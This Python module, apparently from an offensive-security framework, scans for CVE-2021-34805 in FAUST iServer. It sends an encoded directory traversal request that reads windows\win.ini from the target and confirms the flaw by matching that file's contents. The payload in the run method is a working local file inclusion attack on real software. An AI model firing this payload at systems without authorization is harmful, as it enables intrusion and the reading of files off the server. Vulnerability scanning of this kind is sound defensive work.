#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FAUST iServer before 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FAUST iServer 9.0.018.018.4 - Local File Inclusion Detection',
        'description': 'FAUST iServer before 9.0.019.019.7 is susceptible to local file inclusion because for each URL request it accesses the corresponding .fau file on the operating system without preventing %2e%2e%5c directory traversal.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'packetstorm', 'faust', 'iserver', 'land-software', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2022010120',
            'http://packetstormsecurity.com/files/165701/FAUST-iServer-9.0.018.018.4-Local-File-Inclusion.html',
            'http://www.land-software.de/lfs.fau?prj=iweb&dn=faust+iserver',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-34805',
            'https://github.com/20142995/Goby',
        ],
        'cve': 'CVE-2021-34805',
    }

    def run(self):
        r = self.http_request(method="GET", path='/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="FAUST iServer 9.0.018.018.4 - Local File Inclusion detected",
                path='/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
            )
            return True
        return False

